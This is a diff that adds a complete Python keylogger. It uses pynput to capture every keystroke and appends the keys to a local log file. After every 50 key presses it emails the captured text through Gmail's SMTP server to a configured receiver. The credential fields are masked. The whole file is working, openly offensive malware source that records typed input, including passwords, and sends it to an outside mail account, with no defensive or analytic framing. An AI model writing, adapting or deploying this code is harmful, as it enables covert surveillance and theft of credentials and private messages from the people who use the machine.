@@ -1,0 +1,87 @@
+from pynput import keyboard
+import time
+import smtplib
+import threading
+from email.mime.text import MIMEText
+
+# Configuration
+LOG_FILE = "keylog.txt"
+EMAIL_ALERTS = True  # Set to False if you don't want email alerts
+EMAIL_ADDRESS = "XXXXXXXXXXXXXXXXXX"  # Use your actual email
+EMAIL_PASSWORD = "XXXXXXXXXXXXXXXX"  # Use App Password, not your real password!
+EMAIL_RECEIVER = "XXXXXXXXXXX@gmail.com"
+SMTP_SERVER = "smtp.gmail.com"  # Change based on your provider
+SMTP_PORT = 587  # Usually 587 for TLS
+
+SEND_INTERVAL = 50  # Send email after every 50 key presses
+key_log = []  # Buffer for storing keystrokes
+
+
+def send_email(log_data):
+    """Sends key logs via email."""
+    if not EMAIL_ALERTS:
+        return
+
+    msg = MIMEText(log_data)
+    msg["Subject"] = "Keylogger Report"
+    msg["From"] = EMAIL_ADDRESS
+    msg["To"] = EMAIL_RECEIVER
+
+    try:
+        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
+        server.starttls()
+        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+        server.sendmail(EMAIL_ADDRESS, EMAIL_RECEIVER, msg.as_string())
+        server.quit()
+        print("[INFO] Email sent successfully.")
+    except Exception as e:
+        print(f"[ERROR] Email sending failed: {e}")
+
+
+def write_to_file():
+    """Appends captured keys to the log file instead of overwriting it."""
+    with open(LOG_FILE, "a") as log_file:  # "a" mode appends instead of overwriting
+        log_file.write("".join(key_log))
+    print(f"[INFO] {len(key_log)} keys written to {LOG_FILE}")
+
+
+def process_keys():
+    """Processes the key log buffer, writes to file, and sends email if needed."""
+    global key_log
+    if key_log:
+        write_to_file()  # Save logs to file
+        if EMAIL_ALERTS and len(key_log) >= SEND_INTERVAL:
+            send_email("".join(key_log))  # Send email in the background
+        key_log = []  # Clear buffer after processing
+
+
+def on_press(key):
+    """Handles key press events."""
+    global key_log
+    try:
+        key_log.append(key.char)  # Normal keys
+    except AttributeError:
+        special_keys = {
+            keyboard.Key.space: " ",
+            keyboard.Key.enter: "\n",
+            keyboard.Key.tab: "\t",
+            keyboard.Key.backspace: "[BACKSPACE]",
+        }
+        key_log.append(special_keys.get(key, f"[{key.name}]"))  # Handle special keys
+
+    if len(key_log) >= SEND_INTERVAL:
+        threading.Thread(target=process_keys).start()
+
+
+def on_release(key):
+    """Stops keylogger on ESC key."""
+    if key == keyboard.Key.esc:
+        process_keys()  # Save remaining logs before exiting
+        print("[INFO] Keylogger stopped.")
+        return False
+
+
+if __name__ == "__main__":
+    print("[INFO] Keylogger started... Press ESC to stop.")
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
